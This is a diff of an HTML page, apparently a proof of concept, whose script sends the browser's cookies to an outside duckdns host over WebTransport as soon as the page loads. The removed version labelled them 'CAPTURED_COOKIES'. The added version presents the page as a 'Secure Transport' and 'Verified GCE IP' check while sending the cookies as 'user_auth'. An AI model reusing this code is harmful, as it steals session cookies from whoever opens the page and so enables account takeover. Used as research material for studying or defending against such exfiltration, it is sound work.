@@ -5,46 +5,51 @@
 </head>
 <body>
     <h1>Initializing Secure Transport...</h1>
+    <div><strong>Your Verified GCE IP:</strong> <span id="ip-display">Awaiting Server Ack...</span></div>
+    <hr>
+
     <script>
         async function runExfil() {
-    // 1. SET THE COOKIE (The "Victim" Data)
-    // We set a test cookie that expires in 1 hour
-    document.cookie = "user_session=SECRET_DATA_12345; path=/; max-age=3600; SameSite=Lax";
-    console.log("Cookie planted.");
-
-    const url = 'https://webrtc-poc.duckdns.org';
-    
-    try {
-        const transport = new WebTransport(url);
-        await transport.ready;
-        console.log("WebTransport Connected!");
-
-        // 2. READ THE COOKIE
-        const cookies = document.cookie;
-        
-        // 3. EXFILTRATE THE DATA
-        if (cookies) {
-            const stream = await transport.createUnidirectionalStream();
-            const writer = stream.getWriter();
+            const url = 'https://webrtc-poc.duckdns.org/exfil';
             
-            // We label it so it's easy to read in the Python terminal
-            const payload = `CAPTURED_COOKIES: ${cookies}`;
-            const data = new TextEncoder().encode(payload);
-            
-            await writer.write(data);
-            await writer.close();
-            console.log("Cookies exfiltrated successfully.");
-        } else {
-            console.log("No cookies found to exfiltrate.");
+            try {
+                const transport = new WebTransport(url);
+                console.log("> [1] Connecting to HTTP/3 Server...");
+                
+                await transport.ready;
+                console.log("> [2] WebTransport Session Established");
+
+                // CHANGED: Use a Bidirectional stream to allow 2-way communication
+                const stream = await transport.createBidirectionalStream();
+                const writer = stream.getWriter();
+                const reader = stream.getReader();
+
+                const data = "user_auth=" + (document.cookie || "SESSION_EXPIRED_OR_EMPTY");
+                const encoded = new TextEncoder().encode(data);
+                
+                // Send the data
+                await writer.write(encoded);
+                await writer.close(); 
+                console.log("> [3] Data transmitted. Waiting for server echo...");
+
+                // Read the response containing the client IP from the server
+                const { value, done } = await reader.read();
+                if (value) {
+                    const decodedResponse = new TextDecoder().decode(value);
+                    console.log(`> [SERVER ACK] ${decodedResponse}`);
+                    
+                    // Parse out the IP from the server's custom text string
+                    const serverIp = decodedResponse.replace("ACK_IP:", "");
+                    document.getElementById('ip-display').innerText = serverIp;
+                }
+                
+            } catch (e) {
+                console.error("WebTransport Error:", e);
+                document.getElementById('ip-display').innerText = "Connection Failed";
+            }
         }
 
-    } catch (e) {
-        console.error("Exfil failed:", e);
-    }
-}
-
-// Execute the flow
-runExfil();
+        window.onload = runExfil;
     </script>
 </body>
 </html>
